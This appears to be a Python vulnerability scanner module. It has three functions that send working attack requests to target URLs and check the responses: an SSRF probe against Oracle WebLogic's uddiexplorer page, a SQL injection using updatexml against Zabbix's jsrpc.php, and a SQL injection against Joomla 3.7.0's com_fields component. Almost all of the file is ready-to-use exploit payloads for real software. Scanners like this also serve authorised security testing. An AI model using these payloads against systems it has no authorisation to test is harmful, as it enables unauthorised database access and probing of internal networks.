import requests

def weblogic_ssrf(url):
    url = url.strip('/')
    payload = r"/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://127.0.0.1:27989"
    url = url + payload
    r = requests.get(url, allow_redirects=False, verify=False)
    if 'could not connect over HTTP to server' in r.text:
        return 'Weblogic SSRF url: {}'.format(url)

def zabbix_jsrpc_sql(url):
    payload = "/jsrpc.php?type=9&method=screen.get&timestamp=1471403798083&pageFile=history.php&profileIdx=web.item.graph&profileIdx2=1+or+updatexml(1,md5(0x11),1)+or+1=1)%23&updateProfile=true&period=3600&stime=20160817050632&resourcetype=17"
    try:
        r = requests.get(url + payload, timeout=5, verify=False)
        if ('ed733b8d10be225eceba344d533586' in r.text) or ('SQL error ' in r.text):
            return 'zabbix jsrpc sqli:' + url
    except Exception as e:
        pass

def Joomla_sql(url):
    payload = "/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x3a,concat(1,(select%20md5(1))),1)"
    try:
        r = requests.get(url + payload, timeout=5, verify=False)
        if ('c4ca4238a0b923820dcc509a6f75849b' in r.text) or ('SQL error ' in r.text):
            return 'Joomla 3.7.0 Core SQL Injection: ' + url
    except Exception as e:
        pass